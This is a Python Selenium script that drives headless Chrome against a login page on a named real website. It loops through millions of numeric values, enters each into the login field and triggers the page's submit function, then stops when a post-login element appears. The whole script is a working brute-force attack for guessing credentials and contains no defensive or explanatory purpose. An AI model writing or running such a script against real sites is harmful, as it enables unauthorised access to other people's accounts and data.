from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException

options = Options()
options.headless = True
options.add_argument("--window-size=1920,1200")

DRIVER_PATH = 'D:\EDUCO\github\webscrapaing\scrapingSelenium\chromedriver.exe'
driver = webdriver.Chrome(options=options, executable_path=DRIVER_PATH)

driver.get("https://cuantic.000webhostapp.com/vista/login.php")

for i in range(40506000,50000000):
    print("Probando => ",i)
    login = driver.find_element_by_xpath("//input[@type='text']").send_keys(str(i))
    #password = driver.find_element_by_xpath("//input[@type='password']").send_keys('1234567gdf9')
    #submit = driver.find_element_by_xpath("//input[@value='login']").click()
    driver.execute_script("ejecutar();")
    try:
        logout_button = driver.find_element_by_id("export_data")
        print('Successfully logged in')
        break;
    except NoSuchElementException:
        print('Incorrect login/password')
        
